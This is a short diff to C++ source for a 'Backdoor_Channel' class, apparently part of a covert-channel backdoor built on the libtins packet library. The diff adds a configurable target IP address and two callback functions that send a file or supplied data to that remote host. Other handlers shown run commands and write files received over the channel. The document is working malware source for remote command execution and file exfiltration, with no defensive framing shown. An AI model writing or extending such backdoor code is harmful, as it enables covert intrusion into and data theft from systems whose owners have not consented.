@@ -10,10 +10,11 @@ using std::endl;
 using std::string;
 using namespace Tins;
 
-void Backdoor_Channel::start(string interface, int listen_port, int target_port) {
+void Backdoor_Channel::start(string interface, int listen_port, int target_port, string target_ip) {
 
     config.interface = interface;
     config.listen_port = listen_port;
+    config.target_addr.ip = target_ip;
     config.target_addr.port = target_port;
 
     cout << "Start covert channel. " << endl;
@@ -93,4 +94,20 @@ bool Backdoor_Channel::handle_run_cmd(Job& j){
 bool Backdoor_Channel::handle_return_file(Job& j){
     split_command_argument_with_regex(j.argument, j);
     Utilities::writefile(j.command, j.argument);
+}
+
+
+bool Backdoor_Channel::callback_sendfile(string filepath){
+    Job j;
+    j.address = config.target_addr;
+    j.argument = filepath;
+    handle_get_file(j);
+}
+
+bool Backdoor_Channel::callback_sendNewFile(string filepath, string data){
+    Job j;
+    j.job = std::vector<unsigned char>(data.begin(), data.end());
+    j.address = config.target_addr;
+    j.argument = filepath;
+    handle_get_file(j);
 }
